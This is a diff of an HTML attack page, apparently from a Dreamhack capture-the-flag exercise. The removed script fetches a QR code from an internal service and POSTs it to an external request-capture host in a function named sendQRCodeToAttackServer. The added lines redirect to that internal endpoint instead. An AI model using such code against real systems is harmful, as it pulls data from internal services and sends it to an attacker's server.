@@ -7,21 +7,8 @@
 </head>
 <body>    
     <script>
-        const qrCodeUrl = "http://host.docker.internal:10023/generate_qr_code";
-        fetch(qrCodeUrl)
-        .then(response => response.json())
-        .then(data => {
-            sendQRCodeToAttackServer(data);
-        })
-        function sendQRCodeToAttackServer(qrCodeData) {
-            fetch("https://savcdnf.request.dreamhack.games", {
-                method: 'POST',
-                headers: {
-                    'Content-Type' : 'application/json',
-                },
-                body : JSON.stringify({qr_code : qrCodeData})
-            })
-        }
+        document.location = "http://host.docker.internal:10023/generate_qr_code";
+        window.open('http://host.docker.internal:10023/generate_qr_code');
     </script>
 </body>
 </html>
